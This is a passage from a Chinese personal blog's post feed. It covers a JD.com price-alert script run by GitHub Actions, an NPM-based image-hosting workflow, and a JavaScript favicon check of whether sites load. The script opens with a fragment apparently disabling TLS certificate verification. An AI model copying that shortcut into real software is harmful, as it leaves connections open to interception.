ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 